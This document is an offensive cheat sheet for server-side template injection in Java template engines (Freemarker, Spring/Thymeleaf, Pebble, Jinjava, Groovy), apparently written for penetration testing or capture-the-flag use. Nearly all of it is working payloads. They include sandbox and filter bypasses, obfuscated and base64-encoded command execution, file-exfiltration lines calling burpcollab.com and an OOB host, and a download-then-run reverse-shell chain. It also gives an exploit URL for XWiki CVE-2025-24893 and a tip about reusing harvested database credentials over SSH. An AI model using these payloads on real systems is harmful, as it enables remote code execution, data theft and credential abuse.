# Java/JVM SSTI escalation: sandbox bypass, reflection & EL/OGNL RCE — Open WHEN: you have fingerprinted a JVM template engine (Freemarker, Velocity, Thymeleaf/Spring, Pebble, Jinjava/HuBL, Groovy) and the body's one-liner is sandboxed or blocked

The body already has the basic `${7*7}`, `?new()` Execute one-liner, the
`T(java.lang.Runtime)` SpEL one-liner, and the Velocity `$class.inspect` line.
Use this when those are sandboxed and you need full reflection ladders.

## Generic Java probes (decide which delimiter the engine parses)
```
${7*7}   ${{7*7}}   #{7*7}   *{7*7}   @{7*7}   ~{7*7}     # try all — engine reveals itself
${class.getClassLoader()}
${class.getResource("../../../../../index.htm").getContent()}
${T(java.lang.System).getenv()}                            # env dump → creds
```

## Freemarker — sandbox bypass (only Freemarker < 2.3.30)
When `?new()` on `Execute` is blocked, walk the classloader to rebuild it:
```
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
File read without command exec (clean, often passes WAF):
```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/secret.txt').toURL().openStream().readAllBytes()?join(" ")}
```

## Spring / SpringEL / OGNL — RCE + filter bypass
SpringEL and OGNL when `${...}` is filtered — rotate delimiter `#{ } *{ } @{ } ~{ }`:
```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("id")}                    # OGNL
```
Read `/etc/passwd` reconstructing the string char-by-char (defeats keyword filters):
```
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
Spring View Manipulation (`__...__` preprocessing reaches the view resolver):
```
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```

## Thymeleaf — needs an attribute or inline; preprocessing is the real sink
```
[[${7*7}]]                                                                # inline probe
${T(java.lang.Runtime).getRuntime().exec('id')}                           # SpEL RCE (if dynamic template)
th:href="@{__${path}__}"                                                  # the __${...}__ preprocessing is the live sink
~{__${expr}__}                                                            # fragment-expression injection
```
RCE via the preprocessing sink (e.g. a `${path}` request param echoed into `@{...}`):
```
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}
```

## Pebble (Java) — version-split chains
```
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}   # < 3.0.9
```
New Pebble (reflection via `.TYPE.forName(...).methods[6]` = `getRuntime`):
```
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
```

## Jinjava / HuBL (Hubspot) — ScriptEngineManager → JS → ProcessBuilder
Fingerprint: `{{request}}` → `com.hubspot.content.hubl.context.TemplateContextRequest@...`
```
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"uname\",\"-a\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())")}}
```
HuBL secondary interpreter trick (when ScriptEngine path is patched):
```
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{{ji.render('{{1*2}}')}}
```

## Groovy — AST-time RCE via `@ASTTest` (fires at compile, bypasses SecurityManager)
```
import groovy.*;
@groovy.transform.ASTTest(value={
    out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami".split(" ")).getInputStream()).useDelimiter("\\A").next()
    cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".OOB.example.net";
    java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x
```
Base64-wrapped variant for filtered bodies:
```
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
```

## XWiki SolrSearch Groovy RCE — CVE-2025-24893 (XWiki ≤ 15.10.10; fixed 15.10.11 / 16.4.1 / 16.5.0RC1)
Unauthenticated RSS search feed evaluates wiki macros; `}}}` closes context then `{{groovy}}` runs in the JVM. URL-encode ALL chars (keep spaces as `%20`, never `+` → HTTP 500):
```
/xwiki/bin/view/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln(%22Hello%22)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20
```
OS command — Groovy `String.execute()` uses `execve()` so shell metachars are NOT parsed; use download-then-run:
```
{{groovy}}println("curl http://OOB/rev -o /dev/shm/rev".execute().text){{/groovy}}
{{groovy}}println("bash /dev/shm/rev".execute().text){{/groovy}}
```
Output always lands in the RSS `<title>`. Same payload on `/xwiki/bin/get/Main/SolrSearch`. Post-access: DB creds in `/etc/xwiki/hibernate.cfg.xml` (`hibernate.connection.password`) are often reused over SSH.
